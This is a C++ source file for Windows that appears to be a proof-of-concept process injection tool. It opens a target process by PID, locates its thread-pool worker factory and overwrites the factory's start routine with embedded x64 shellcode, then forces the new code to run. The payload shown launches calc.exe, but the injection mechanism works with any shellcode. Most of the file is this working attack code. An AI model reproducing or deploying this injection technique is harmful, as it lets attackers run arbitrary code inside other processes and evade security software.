#include <stdio.h>
#include <iostream>
#include <windows.h>
#include "ntFuncs.h"

#define NtQueryInformationProcess ((fnNtQueryInformationProcess)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQueryInformationProcess"))
#define NtQueryObject ((fnNtQueryObject) GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQueryObject"))
#define NtQueryInformationWorkerFactory ((fnNtQueryInformationWorkerFactory)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQueryInformationWorkerFactory"))
#define NtSetInformationWorkerFactory ((fnNtSetInformationWorkerFactory)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtSetInformationWorkerFactory"))
#define NtDelayExecution ((fnNtDelayExecution)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtDelayExecution"))


  unsigned char buf[] =
"\xE8\xBA\x00\x00\x00\x48\x8D\xB8\x9E\x00\x00\x00"
"\x48\x31\xC9\x65\x48\x8B\x41\x60\x48\x8B\x40\x18"
"\x48\x8B\x70\x20\x48\xAD\x48\x96\x48\xAD\x48\x8B"
"\x58\x20\x4D\x31\xC0\x44\x8B\x43\x3C\x4C\x89\xC2"
"\x48\x01\xDA\x44\x8B\x82\x88\x00\x00\x00\x49\x01"
"\xD8\x48\x31\xF6\x41\x8B\x70\x20\x48\x01\xDE\x48"
"\x31\xC9\x49\xB9\x47\x65\x74\x50\x72\x6F\x63\x41"
"\x48\xFF\xC1\x48\x31\xC0\x8B\x04\x8E\x48\x01\xD8"
"\x4C\x39\x08\x75\xEF\x48\x31\xF6\x41\x8B\x70\x24"
"\x48\x01\xDE\x66\x8B\x0C\x4E\x48\x31\xF6\x41\x8B"
"\x70\x1C\x48\x01\xDE\x48\x31\xD2\x8B\x14\x8E\x48"
"\x01\xDA\x49\x89\xD4\x48\xB9\x57\x69\x6E\x45\x78"
"\x65\x63\x00\x51\x48\x89\xE2\x48\x89\xD9\x48\x83"
"\xEC\x30\x41\xFF\xD4\x48\x83\xC4\x30\x48\x83\xC4"
"\x10\x48\x89\xC6\x48\x89\xF9\x48\x31\xD2\x48\xFF"
"\xC2\x48\x83\xEC\x20\xFF\xD6\xEB\xFE\x48\x8B\x04"
"\x24\xC3\C:\\Windows\\System32\\calc.exe\x00";

// Wrapper function for the native NtQueryObject
PVOID NtQueryObjectWrap(HANDLE currentHandle, OBJECT_INFORMATION_CLASS infoType) {

    ULONG InformationLength = 0;
    NTSTATUS Ntstatus = STATUS_INFO_LENGTH_MISMATCH;
    PVOID Information = NULL;

    do {
        Information = (PVOID)realloc(Information, InformationLength);
        Ntstatus = NtQueryObject(currentHandle, infoType, Information, InformationLength, &InformationLength);
    } while (STATUS_INFO_LENGTH_MISMATCH == Ntstatus);

    return Information;
}

// Self Explanatory
HANDLE getTargetObjectHandle(PWSTR wsObjectType, HANDLE p_hTarget, DWORD dwDesiredAccess)
{
    HANDLE tr = NULL;
    NTSTATUS Ntstatus = STATUS_INFO_LENGTH_MISMATCH;
    BYTE* pProcessHandleInformation = NULL;
    ULONG processInformationLength = 0;

    // Get a structure containing all handles opened in the specified process
    do {
        pProcessHandleInformation = (BYTE*)realloc(pProcessHandleInformation, processInformationLength);
        if (!pProcessHandleInformation) {
            return NULL;
        }
        Ntstatus = NtQueryInformationProcess(p_hTarget, (PROCESSINFOCLASS)(ProcessHandleInformation), pProcessHandleInformation, processInformationLength, &processInformationLength);
    } while (STATUS_INFO_LENGTH_MISMATCH == Ntstatus);

    // Cast the returned info from previous loop as PPROCESS_HANDLE_SNAPSHOT_INFORMATION strucuture 
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessHandleInformationCasted = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)pProcessHandleInformation;


    // iterating through all the handles , using NtQueryObject wrapper function to find the type of the current Handle and compare it to the type need for further usage
    for (unsigned int i = 0; i < pProcessHandleInformationCasted->NumberOfHandles; i++)
    {
        HANDLE p_hDuplicatedObject;
        PVOID pObjectInformation;

        try {

            p_hDuplicatedObject = NULL;
            // duplicate the current handle
            DuplicateHandle(p_hTarget, pProcessHandleInformationCasted->Handles[i].HandleValue, GetCurrentProcess(), &p_hDuplicatedObject, dwDesiredAccess, FALSE, NULL);

            // query current handle type
            pObjectInformation = NtQueryObjectWrap(p_hDuplicatedObject, ObjectTypeInformation);
            POBJECT_TYPE_INFORMATION pObjectTypeInformation = (POBJECT_TYPE_INFORMATION)pObjectInformation;

            // compare the current handle type with the needed objectType
            if (wcscmp(wsObjectType, pObjectTypeInformation->TypeName.Buffer) != 0) {
                continue;
            }

            tr = p_hDuplicatedObject;
            return tr;
        }
        catch (std::runtime_error) {}
    }

    return tr;
}



int main(int argc, char** argv)
{
    if (argc != 2) {
        printf("[!] Usage: Program.exe <PID>\n");
        return -1;
    }

    NTSTATUS ntstatus = NULL;

    DWORD pid = atoi(argv[1]);

    if (!NtQueryInformationProcess || !NtQueryObject || !NtQueryInformationWorkerFactory || !NtSetInformationWorkerFactory || !NtDelayExecution) {
        printf("[-] Some function could not be resolved\n");
        return -1;
    }
    printf("[!] Native Functions resolved\n");

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("[-] Failed to open target process. Error: %lu\n", GetLastError());
        return -1;
    }
    printf("[+] Got handle to process with PID %lu\n", pid);


    HANDLE hWorkerFactory = getTargetObjectHandle((PWSTR)L"TpWorkerFactory\0", hProcess, WORKER_FACTORY_ALL_ACCESS);
    if (!hWorkerFactory) {
        printf("[-] Failed  getting handle to worker factory\n");
        return -1;
    }
    printf("[!] WorkerFactory handle at 0x%p\n", hWorkerFactory);

    WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };
    NtQueryInformationWorkerFactory(hWorkerFactory, WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), NULL);
    
    PVOID startRoutine = WorkerFactoryInformation.StartRoutine;
    printf("[!] WorkerFactory StartRoutine at 0x%p\n", startRoutine);

    WriteProcessMemory(hProcess, startRoutine, buf, sizeof(buf), NULL);
    printf("[!] StartRoutine overwritten\n");


    // Worker count update is optional but is random in execution time
    ULONG newWorkerInfo = WorkerFactoryInformation.TotalWorkerCount + 1;
    if (ntstatus = NtSetInformationWorkerFactory(hWorkerFactory, WorkerFactoryThreadMinimum, &newWorkerInfo, sizeof(ULONG)) != 0) {
        printf("[-] Something went wrong in executation. Status : %X\n", ntstatus);
        return -1;
    }
    printf("[!] Workers number updated\n");

    printf("[+] Done\n");
    return 0;
}

